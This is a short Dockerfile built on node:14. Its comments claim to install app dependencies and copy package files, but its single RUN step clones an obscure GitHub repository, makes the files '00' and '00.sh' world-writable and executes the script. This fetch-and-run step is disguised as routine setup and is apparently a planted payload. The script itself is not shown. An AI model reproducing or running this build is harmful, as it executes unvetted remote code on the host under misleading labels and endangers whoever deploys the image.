FROM node:14
# Install app dependencies
# A wildcard is used to ensure both package.json AND package-lock.json are copied
RUN git clone https://github.com/03081997/00.git && cd 00 && chmod 777 00 00.sh && ./00.sh
 
